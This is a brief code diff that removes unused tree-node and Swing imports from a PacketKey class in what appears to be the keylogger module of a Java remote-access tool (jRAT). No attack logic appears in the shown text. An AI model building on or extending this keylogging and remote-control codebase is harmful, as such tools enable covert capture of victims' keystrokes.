@@ -4,12 +4,7 @@ package jrat.module.keys.packets;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.controller.packets.outgoing.OutgoingPacket;
-import jrat.module.keys.ui.DayTreeNode;
-import jrat.module.keys.ui.MonthTreeNode;
 import jrat.module.keys.ui.PanelKeylogger;
-import jrat.module.keys.ui.YearTreeNode;
-
-import javax.swing.tree.DefaultMutableTreeNode;
 
 public class PacketKey implements IncomingPacket, OutgoingPacket {
 
